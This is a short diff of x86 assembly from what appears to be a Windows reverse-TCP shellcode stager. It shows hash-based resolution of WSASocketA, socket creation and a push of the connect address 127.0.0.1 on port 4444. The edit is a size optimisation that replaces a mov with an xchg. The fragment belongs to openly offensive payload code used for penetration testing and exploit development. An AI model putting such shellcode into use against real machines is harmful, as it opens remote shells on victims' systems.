@@ -33,7 +33,7 @@ reverse_tcp:
   push eax               ; push AF_INET
   push 0xE0DF0FEA        ; hash( "ws2_32.dll", "WSASocketA" )
   call ebp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
-  mov edi, eax           ; save the socket for later
+  xchg edi, eax          ; save the socket for later, don't care about the value of eax after this
   
   push 0x0100007F        ; host 127.0.0.1
   push 0x5C110002        ; family AF_INET and port 4444
